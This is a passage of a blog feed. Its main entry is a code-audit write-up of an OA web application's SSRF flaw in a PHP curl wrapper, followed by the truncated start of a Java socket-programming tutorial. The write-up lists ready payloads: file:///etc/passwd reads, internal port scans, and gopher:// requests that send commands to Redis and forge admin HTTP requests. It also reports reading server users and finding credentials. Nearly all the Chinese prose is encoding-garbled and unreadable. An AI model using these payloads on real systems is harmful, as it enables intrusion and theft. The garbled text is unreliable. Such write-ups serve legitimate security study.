function_ invoke__">stream_socket_client</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. XMLç›¸å…³</span></span><br><span class="line"><span class="title function_ invoke__">simplexml_load_file</span>()</span><br><span class="line"><span class="title class_">DOMDocument</span>::<span class="title function_ invoke__">load</span>()</span><br><span class="line"><span class="title class_">XMLReader</span>::<span class="title function_ invoke__">open</span>()</span><br></pre></td></tr></table></figure><p>PHPä¸­å¯èƒ½æœ‰ä¸Šè¿°å‡½æ•°å­˜åœ¨SSRFï¼Œæ£€ç´¢<code>curl_setopt()</code>ï¼Œå‘ç°ä½¿ç”¨çš„åœ°æ–¹è¿˜æ˜¯æŒºå¤šçš„ã€‚<br><img src="/2024/11/01/WebSecurity/codeaudit/randomfileread/image.png"><br>ä½†é‡ç‚¹å…³æ³¨ application ç›®å½•ä¸‹çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getaccess_token</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$config</span> = <span class="title function_ invoke__">model</span>(<span class="string">&#x27;Setting&#x27;</span>)-&gt;<span class="title function_ invoke__">fetchAll2</span>();</span><br><span class="line">       <span class="variable">$url</span> = <span class="string">&quot;https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=&quot;</span> . <span class="variable">$config</span>[<span class="string">&#x27;wxapp&#x27;</span>][<span class="string">&#x27;appid&#x27;</span>] . <span class="string">&quot;&amp;secret=&quot;</span> . <span class="variable">$config</span>[<span class="string">&#x27;wxapp&#x27;</span>][<span class="string">&#x27;appsecret&#x27;</span>] . <span class="string">&quot;&quot;</span>;</span><br><span class="line">       <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">       <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">       <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">       <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="number">0</span>);</span><br><span class="line">       <span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">       <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">       <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$data</span>, <span class="literal">true</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$data</span>[<span class="string">&#x27;access_token&#x27;</span>];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ç¬¬ä¸€å¤„çš„ï¼Œå‘ç°æ²¡æœ‰å‚æ•°å¯æ§ï¼Œæ”¾å¼ƒäº†ã€‚<br>ç¬¬äºŒå¤„ï¼Œurlæ˜¯å¯æ§çš„ï¼Œç›´æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">httpRequest</span>(<span class="params"><span class="variable">$url</span>,<span class="variable">$data</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$curl</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_SSL_VERIFYPEER,<span class="literal">FALSE</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_SSL_VERIFYHOST,<span class="literal">FALSE</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_POST,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_POSTFIELDS,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curl</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curl</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curl</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>SSRF æ¼æ´å¯èƒ½å¯¼è‡´çš„å±å®³ï¼š</p><h3 id="1-è¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ï¼ˆä½¿ç”¨-file-åè®®ï¼‰"><a href="#1-è¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ï¼ˆä½¿ç”¨-file-åè®®ï¼‰" class="headerlink" title="1. è¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ï¼ˆä½¿ç”¨ file:// åè®®ï¼‰"></a>1. è¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ï¼ˆä½¿ç”¨ <code>file://</code> åè®®ï¼‰</h3><p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ <code>file://</code> åè®®æ¥è¯»å–æœåŠ¡å™¨ä¸Šçš„æœ¬åœ°æ–‡ä»¶ã€‚é€šè¿‡æŒ‡å®š <code>file://</code> åè®®ï¼Œæ”»å‡»è€…å¯ä»¥è®¿é—®ç³»ç»Ÿä¸­çš„æ•æ„Ÿæ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;file:///etc/passwd&quot;);</span><br><span class="line">httpRequest(&quot;file:///C:/Windows/system32/drivers/etc/hosts&quot;);</span><br></pre></td></tr></table></figure><p>è¿™ç±»è¯·æ±‚å¯ä»¥æ³„éœ²æ“ä½œç³»ç»Ÿé…ç½®æ–‡ä»¶ã€å¯†ç æ–‡ä»¶ç­‰æ•æ„Ÿä¿¡æ¯ï¼Œå¸®åŠ©æ”»å‡»è€…è¿›ä¸€æ­¥æ”»å‡»æˆ–å‘ç°æ¼æ´ã€‚</p><h3 id="2-æ¢æµ‹å†…ç½‘ä¸»æœºå’Œç«¯å£"><a href="#2-æ¢æµ‹å†…ç½‘ä¸»æœºå’Œç«¯å£" class="headerlink" title="2. æ¢æµ‹å†…ç½‘ä¸»æœºå’Œç«¯å£"></a>2. æ¢æµ‹å†…ç½‘ä¸»æœºå’Œç«¯å£</h3><p>SSRF å¯ä»¥è®©æ”»å‡»è€…é€šè¿‡è¯·æ±‚ä¸åŒçš„å†…ç½‘ IP åœ°å€å’Œç«¯å£ï¼Œå¯¹å†…éƒ¨ç½‘ç»œè¿›è¡Œç«¯å£æ‰«æï¼Œä»è€Œäº†è§£ç½‘ç»œæ‹“æ‰‘ç»“æ„ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¯·æ±‚å†…ç½‘åœ°å€æ¥å‘ç°å“ªäº›æœåŠ¡åœ¨è¿è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;http://192.168.0.1:22&quot;);  // å°è¯•è¿æ¥ SSH æœåŠ¡</span><br><span class="line">httpRequest(&quot;http://192.168.0.1:3306&quot;); // å°è¯•è¿æ¥æ•°æ®åº“</span><br></pre></td></tr></table></figure><h3 id="3-è®¿é—®å†…ç½‘æœåŠ¡"><a href="#3-è®¿é—®å†…ç½‘æœåŠ¡" class="headerlink" title="3. è®¿é—®å†…ç½‘æœåŠ¡"></a>3. è®¿é—®å†…ç½‘æœåŠ¡</h3><p>SSRF æ¼æ´å…è®¸æ”»å‡»è€…è®¿é—®å†…ç½‘ä¸­çš„å—ä¿æŠ¤æœåŠ¡å’Œ APIï¼Œè¿™äº›æœåŠ¡é€šå¸¸ä¸å¯¹å¤–å¼€æ”¾ã€‚ä¾‹å¦‚ï¼Œä¼ä¸šå†…éƒ¨çš„ç®¡ç†é¢æ¿ã€æ•°æ®åº“æ¥å£æˆ–å…¶ä»–æ•æ„Ÿç³»ç»Ÿã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æŒ‡å®šå†…ç½‘åœ°å€ï¼Œåˆ©ç”¨ SSRF è¯·æ±‚æ¥ä¸è¿™äº›æœåŠ¡é€šä¿¡ï¼Œä»è€Œè·å–æ•æ„Ÿæ•°æ®æˆ–æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;http://127.0.0.1:8080/admin&quot;);</span><br><span class="line">httpRequest(&quot;http://192.168.1.2:5000/internal-api&quot;);</span><br></pre></td></tr></table></figure><h3 id="4-ç»•è¿‡é˜²ç«å¢™é™åˆ¶"><a href="#4-ç»•è¿‡é˜²ç«å¢™é™åˆ¶" class="headerlink" title="4. ç»•è¿‡é˜²ç«å¢™é™åˆ¶"></a>4. ç»•è¿‡é˜²ç«å¢™é™åˆ¶</h3><p>å¾ˆå¤šæƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨æ‰€åœ¨çš„é˜²ç«å¢™ç­–ç•¥ä¼šç¦æ­¢ç›´æ¥è®¿é—®å¤–éƒ¨ç½‘ç»œï¼Œä½†å…è®¸æœåŠ¡å™¨ä¸å†…ç½‘é€šä¿¡ã€‚SSRF æ¼æ´ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œç»•è¿‡é˜²ç«å¢™é™åˆ¶è®¿é—®å†…ç½‘æˆ–å…¶ä»–å—ä¿æŠ¤èµ„æºã€‚<br>ä¾‹å¦‚ï¼Œå¦‚æœæœåŠ¡å™¨åœ¨ DMZ åŒºåŸŸï¼ˆå¤–ç½‘ä¸å†…ç½‘ä¹‹é—´çš„éš”ç¦»åŒºï¼‰ï¼Œæ”»å‡»è€…å¯èƒ½åˆ©ç”¨ SSRF ç»•è¿‡ DMZï¼Œç›´æ¥è®¿é—®å†…ç½‘èµ„æºï¼Œè¿™ä¼šå¸¦æ¥ä¸¥é‡çš„å®‰å…¨å¨èƒã€‚</p><h3 id="5-åˆ©ç”¨ç‰¹å®šåè®®"><a href="#5-åˆ©ç”¨ç‰¹å®šåè®®" class="headerlink" title="5. åˆ©ç”¨ç‰¹å®šåè®®"></a>5. åˆ©ç”¨ç‰¹å®šåè®®</h3><p>åˆ©ç”¨ <code>file://</code>ã€<code>dict://</code>ã€<code>gopher://</code> ç­‰åè®®çš„ SSRF æ”»å‡»å¯ä»¥å¸¦æ¥ä¸¥é‡çš„å®‰å…¨å¨èƒï¼Œå°¤å…¶æ˜¯åœ¨æœåŠ¡å™¨æ”¯æŒè¿™äº›åè®®çš„æƒ…å†µä¸‹ã€‚ä»¥ä¸‹æ˜¯è¿™äº›åè®®çš„å…·ä½“åˆ©ç”¨æ–¹å¼åŠå¯èƒ½å¸¦æ¥çš„å±å®³ï¼š</p><p><code>file://</code> åè®®ï¼Œæ”»å‡»è€…å¯ä»¥è®¿é—®æœåŠ¡å™¨ä¸Šçš„æœ¬åœ°æ–‡ä»¶å¹¶è¯»å–å…¶å†…å®¹ã€‚è¿™å¯¹ç³»ç»Ÿä¸­çš„æ•æ„Ÿæ–‡ä»¶ï¼ˆå¦‚é…ç½®æ–‡ä»¶ã€å¯†ç æ–‡ä»¶ç­‰ï¼‰æ„æˆç›´æ¥å¨èƒã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;file:///etc/passwd&quot;);  // è¯»å– Linux ç³»ç»Ÿä¸Šçš„ç”¨æˆ·ä¿¡æ¯æ–‡ä»¶</span><br><span class="line">httpRequest(&quot;file:///C:/Windows/system32/drivers/etc/hosts&quot;);  // è¯»å– Windows ç³»ç»Ÿçš„ hosts æ–‡ä»¶</span><br></pre></td></tr></table></figure><p><code>dict://</code> åè®®æ˜¯ä¸€ä¸ªç”¨äºæŸ¥è¯¢å­—å…¸æœåŠ¡å™¨çš„åè®®ã€‚åœ¨ SSRF æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ¥å‘èµ·å¯¹ç‰¹å®šç«¯å£çš„è¯·æ±‚ï¼Œä»¥ä¾¿æ‰§è¡Œç«¯å£æ‰«ææˆ–è¯·æ±‚æœªæˆæƒçš„æœåŠ¡ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;dict://127.0.0.1:3306&quot;);  // å¯èƒ½ç”¨äºæ£€æµ‹æ•°æ®åº“æœåŠ¡</span><br><span class="line">httpRequest(&quot;dict://internal-service.local:11211&quot;);  // æ£€æµ‹å†…ç½‘ memcached æœåŠ¡</span><br></pre></td></tr></table></figure><p><code>gopher://</code> åè®®æ˜¯ä¸€ç§è¾ƒè€çš„åè®®ï¼Œä½†åœ¨ SSRF æ”»å‡»ä¸­éå¸¸å¼ºå¤§ï¼Œå› ä¸ºå®ƒå¯ä»¥åˆ›å»ºä»»æ„çš„ TCP è¿æ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ„é€ å¤æ‚çš„è¯·æ±‚ï¼Œæ¯”å¦‚å‘æ•°æ®åº“ã€Redisã€HTTP æœåŠ¡ç­‰å‘é€è‡ªå®šä¹‰æŒ‡ä»¤ã€‚ç¤ºä¾‹åŒ…æ‹¬ï¼š</p><ul><li><p><strong>Redis æœªæˆæƒè®¿é—®</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;gopher://127.0.0.1:6379/_SET%20test%20&#x27;hello&#x27;&quot;);</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ„é€  <code>gopher://</code> è¯·æ±‚ï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥å‘ Redis å‘é€å‘½ä»¤ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®ç¯¡æ”¹ã€é…ç½®æ›´æ”¹ç”šè‡³æŒä¹…åŒ–æ”»å‡»è„šæœ¬ã€‚</p></li><li><p><strong>HTTP è¯·æ±‚åŠ«æŒ</strong>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpRequest(&quot;gopher://internal-api.local:80/_GET%20/admin%20HTTP/1.1%0AHost:internal-api.local%0A&quot;);</span><br></pre></td></tr></table></figure><p>é€šè¿‡ <code>gopher://</code> åè®®æ„é€  HTTP è¯·æ±‚ï¼Œå¯ä»¥è®©æœåŠ¡å™¨å‘å†…ç½‘çš„ HTTP æœåŠ¡å‘é€è¯·æ±‚ï¼Œè®¿é—®ç®¡ç†å‘˜é¡µé¢æˆ–å†…éƒ¨æ¥å£ã€‚</p></li></ul><p>é™¤ä»¥ä¸Šå¸¸è§åè®®å¤–ï¼Œè®¸å¤šç³»ç»Ÿå¯èƒ½è¿˜æ”¯æŒå…¶ä»–åè®®ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒä»¬æ¥å®ç°å¤šç§æ”»å‡»æ•ˆæœã€‚ä¾‹å¦‚ï¼š</p><ul><li>**<code>ftp://</code>**ï¼šæ”»å‡»è€…å¯ä»¥å°è¯•è¿æ¥ FTP æœåŠ¡ï¼Œæ¢æµ‹æ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œç”šè‡³ä¸‹è½½æˆ–ä¸Šä¼ æ–‡ä»¶ã€‚</li><li>**<code>http://</code> ä¸ <code>https://</code>**ï¼šå¯ä»¥è®¿é—®æœåŠ¡å™¨å†…éƒ¨æ¥å£ã€ç®¡ç†é¡µé¢ã€API ç­‰ã€‚</li><li>**<code>ldap://</code>**ï¼šå¦‚æœæœåŠ¡å™¨æ”¯æŒ LDAP è¿æ¥ï¼Œæ”»å‡»è€…å¯èƒ½å°è¯•åˆ©ç”¨æ­¤åè®®è¿æ¥ç›®å½•æœåŠ¡ä»¥æ”¶é›†å†…éƒ¨ç”¨æˆ·ä¿¡æ¯ã€‚</li></ul><p>éªŒè¯ï¼š<br><img src="/2024/11/01/WebSecurity/codeaudit/randomfileread/image-1.png" alt="æ¢æµ‹å‡ºæ•°æ®åº“ç‰ˆæœ¬"></p><h2 id="è¿›ä¸€æ­¥æ¸—é€"><a href="#è¿›ä¸€æ­¥æ¸—é€" class="headerlink" title="è¿›ä¸€æ­¥æ¸—é€"></a>è¿›ä¸€æ­¥æ¸—é€</h2><p><a href="https://blog.csdn.net/Yb528970805/article/details/132853787">https://blog.csdn.net/Yb528970805/article/details/132853787</a><br><a href="https://www.freebuf.com/articles/web/337617.html">https://www.freebuf.com/articles/web/337617.html</a><br><a href="https://www.freebuf.com/articles/web/371127.html">https://www.freebuf.com/articles/web/371127.html</a></p><p>å¯ä»¥åˆ©ç”¨ssrfè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œå°è¯•è¿›è¡Œè¿›ä¸€æ­¥æ¸—é€æœé›†<br><img src="/2024/11/01/WebSecurity/codeaudit/randomfileread/image-2.png"><br>å¯ä»¥çœ‹åˆ°åç«¯è¿˜æ˜¯æœ‰å¾ˆå¤šæœåŠ¡çš„<br>www (UID 1000) Web server user Home: &#x2F;home&#x2F;www<br>mysql (UID 1001) Database service user Home: &#x2F;home&#x2F;mysql<br>springboot (UID 1002) Java application user Home: &#x2F;home&#x2F;springboot<br>redis (UID 1003) Redis service user Home: &#x2F;home&#x2F;redis</p><p><img src="/2024/11/01/WebSecurity/codeaudit/randomfileread/image-3.png" alt="æŠ¥é”™"></p><p>å°è¯•è¯»äº†ä¸€äº›å…¶ä»–çš„æ–‡ä»¶ï¼Œä¹Ÿä¸å¤ªè¡Œï¼Œå°±æ‹å›å»çœ‹æºç äº†<br>åˆ†ææºç å¯ä»¥çœ‹åˆ°é…ç½®æ–‡ä»¶é‡Œçš„ æ•°æ®åº“å¸å·å¯†ç ã€å…¬ä¼—å’ŒsecretKey</p>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> OA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Javaå¼€å‘ã€‘ç½‘ç»œç¼–ç¨‹</title>
      <link href="/2024/11/01/code/javanetwork/"/>
      <url>/2024/11/01/code/javanetwork/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>åŸŸåè§£ææœåŠ¡å™¨ DNS è´Ÿè´£æŠŠåŸŸåç¿»è¯‘æˆå¯¹åº”çš„ IPï¼Œå®¢æˆ·ç«¯å†æ ¹æ® IP åœ°å€è®¿é—®æœåŠ¡å™¨ã€‚å¯ä»¥ä½¿ç”¨<code>nslookup</code>æŸ¥çœ‹åŸŸåå¯¹åº”çš„IPåœ°å€ã€‚</p><ul><li>åº”ç”¨å±‚ï¼Œæä¾›åº”ç”¨ç¨‹åºä¹‹é—´çš„é€šä¿¡ï¼›</li><li>è¡¨ç¤ºå±‚ï¼šå¤„ç†æ•°æ®æ ¼å¼ï¼ŒåŠ è§£å¯†ç­‰ç­‰ï¼›</li><li>ä¼šè¯å±‚ï¼šè´Ÿè´£å»ºç«‹å’Œç»´æŠ¤ä¼šè¯ï¼›</li><li>ä¼ è¾“å±‚ï¼šè´Ÿè´£æä¾›ç«¯åˆ°ç«¯çš„å¯é ä¼ è¾“ï¼›</li><li>ç½‘ç»œå±‚ï¼šè´Ÿè´£æ ¹æ®ç›®æ ‡åœ°å€é€‰æ‹©è·¯ç”±æ¥ä¼ è¾“æ•°æ®ï¼›</li><li>é“¾è·¯å±‚å’Œç‰©ç†å±‚è´Ÿè´£æŠŠæ•°æ®è¿›è¡Œåˆ†ç‰‡å¹¶ä¸”çœŸæ­£é€šè¿‡ç‰©ç†ç½‘ç»œä¼ è¾“ï¼Œä¾‹å¦‚ï¼Œæ— çº¿ç½‘ã€å…‰çº¤ç­‰ã€‚</li></ul><p>äº’è”ç½‘å®é™…ä½¿ç”¨çš„ TCP&#x2F;IP æ¨¡å‹å¹¶ä¸æ˜¯å¯¹åº”åˆ° OSI çš„ 7 å±‚æ¨¡å‹ï¼Œè€Œæ˜¯å¤§è‡´å¯¹åº” OSI çš„ 5 å±‚æ¨¡å‹ï¼š<br><img src="/2024/11/01/code/javanetwork/image.png"></p><h3 id="å¸¸è§åè®®"><a href="#å¸¸è§åè®®" class="headerlink" title="å¸¸è§åè®®"></a>å¸¸è§åè®®</h3><p>IP åè®®æ˜¯ä¸€ä¸ªåˆ†ç»„äº¤æ¢ï¼Œå®ƒä¸ä¿è¯å¯é ä¼ è¾“ã€‚è€Œ TCP åè®®æ˜¯ä¼ è¾“æ§åˆ¶åè®®ï¼Œå®ƒæ˜¯é¢å‘è¿æ¥çš„åè®®ï¼Œæ”¯æŒå¯é ä¼ è¾“å’ŒåŒå‘é€šä¿¡ã€‚TCP åè®®æ˜¯å»ºç«‹åœ¨ IP åè®®ä¹‹ä¸Šçš„ï¼Œç®€å•åœ°è¯´ï¼ŒIP åè®®åªè´Ÿè´£å‘æ•°æ®åŒ…ï¼Œä¸ä¿è¯é¡ºåºå’Œæ­£ç¡®æ€§ï¼Œè€Œ TCP åè®®è´Ÿè´£æ§åˆ¶æ•°æ®åŒ…ä¼ è¾“ï¼Œå®ƒåœ¨ä¼ è¾“æ•°æ®ä¹‹å‰éœ€è¦å…ˆå»ºç«‹è¿æ¥ï¼Œå»ºç«‹è¿æ¥åæ‰èƒ½ä¼ è¾“æ•°æ®ï¼Œä¼ è¾“å®Œåè¿˜éœ€è¦æ–­å¼€è¿æ¥ã€‚TCP åè®®ä¹‹æ‰€ä»¥èƒ½ä¿è¯æ•°æ®çš„å¯é ä¼ è¾“ï¼Œæ˜¯é€šè¿‡æ¥æ”¶ç¡®è®¤ã€è¶…æ—¶é‡ä¼ è¿™äº›æœºåˆ¶å®ç°çš„ã€‚å¹¶ä¸”ï¼ŒTCP åè®®å…è®¸åŒå‘é€šä¿¡ï¼Œå³é€šä¿¡åŒæ–¹å¯ä»¥åŒæ—¶å‘é€å’Œæ¥æ”¶æ•°æ®ã€‚</p><p>TCP åè®®ä¹Ÿæ˜¯åº”ç”¨æœ€å¹¿æ³›çš„åè®®ï¼Œè®¸å¤šé«˜çº§åè®®éƒ½æ˜¯å»ºç«‹åœ¨ TCP åè®®ä¹‹ä¸Šçš„ï¼Œä¾‹å¦‚ HTTPã€SMTP ç­‰ã€‚<br>TCPï¼ˆä¼ è¾“æ§åˆ¶åè®®ï¼‰å’Œ IPï¼ˆäº’è”ç½‘åè®®ï¼‰é€šå¸¸ä¸€èµ·ä½¿ç”¨ï¼Œè¢«ç§°ä¸º TCP&#x2F;IP åè®®ã€‚</p><p>TCP&#x2F;IP åè®®æ ˆåˆ†ä¸ºå››å±‚ï¼šåº”ç”¨å±‚ã€ä¼ è¾“å±‚ã€ç½‘ç»œå±‚å’Œé“¾è·¯å±‚ã€‚IP åè®®ä½äºç½‘ç»œå±‚ï¼Œè´Ÿè´£å°†æ•°æ®åŒ…ä»æºä¸»æœºè·¯ç”±åˆ°ç›®æ ‡ä¸»æœºï¼›TCP åè®®ä½äºä¼ è¾“å±‚ï¼Œè´Ÿè´£åœ¨æºä¸»æœºå’Œç›®æ ‡ä¸»æœºä¹‹é—´å»ºç«‹å¯é çš„è¿æ¥å¹¶ç¡®ä¿æ•°æ®çš„æœ‰åºä¼ è¾“ã€‚<br><img src="/2024/11/01/code/javanetwork/image-1.png"></p><p>UDP åè®®ï¼ˆUser Datagram Protocolï¼‰æ˜¯ä¸€ç§æ•°æ®æŠ¥æ–‡åè®®ï¼Œå®ƒæ˜¯æ— è¿æ¥åè®®ï¼Œä¸ä¿è¯å¯é ä¼ è¾“ã€‚å› ä¸º UDP åè®®åœ¨é€šä¿¡å‰ä¸éœ€è¦å»ºç«‹è¿æ¥ï¼Œå› æ­¤å®ƒçš„ä¼ è¾“æ•ˆç‡æ¯” TCP é«˜ï¼Œè€Œä¸” UDP åè®®æ¯” TCP åè®®è¦ç®€å•å¾—å¤šã€‚<br><img src="/2024/11/01/code/javanetwork/image-2.png"></p><h2 id="Java-Socket"><a href="#Java-Socket" class="headerlink" title="Java Socket"></a>Java Socket</h2><p>å¥—æ¥å­—ï¼ˆSocketï¼‰æ˜¯ä¸€ä¸ªæŠ½è±¡å±‚ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡å®ƒå‘é€æˆ–æ¥æ”¶æ•°æ®ï¼›å°±åƒæ“ä½œæ–‡ä»¶é‚£æ ·å¯ä»¥æ‰“å¼€ã€è¯»å†™å’Œå…³é—­ã€‚å¥—æ¥å­—å…è®¸åº”ç”¨ç¨‹åºå°† I&#x2F;O åº”ç”¨äºç½‘ç»œä¸­ï¼Œå¹¶ä¸å…¶ä»–åº”ç”¨ç¨‹åºè¿›è¡Œé€šä¿¡ã€‚ç½‘ç»œå¥—æ¥å­—æ˜¯ IP åœ°å€ä¸ç«¯å£çš„ç»„åˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(<span class="string">&quot;bbs.newsmth.net&quot;</span>, <span class="number">23</span>);) &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(is, <span class="string">&quot;gbk&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (scanner.hasNextLine()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">        System.out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1ï¼‰å»ºç«‹å¥—æ¥å­—è¿æ¥éå¸¸ç®€å•ï¼Œåªéœ€è¦ä¸€è¡Œä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(host, port)</span><br></pre></td></tr></table></figure><p>host ä¸ºä¸»æœºåï¼Œport ä¸ºç«¯å£å·ï¼ˆ23 ä¸ºé»˜è®¤çš„ telnet ç«¯å£å·ï¼‰ã€‚å¦‚æœæ— æ³•ç¡®å®šä¸»æœºçš„ IP åœ°å€ï¼Œåˆ™æŠ›å‡º <code>UnknownHostException</code> å¼‚å¸¸ï¼›å¦‚æœåœ¨åˆ›å»ºå¥—æ¥å­—æ—¶å‘ç”Ÿ IO é”™è¯¯ï¼Œåˆ™æŠ›å‡º 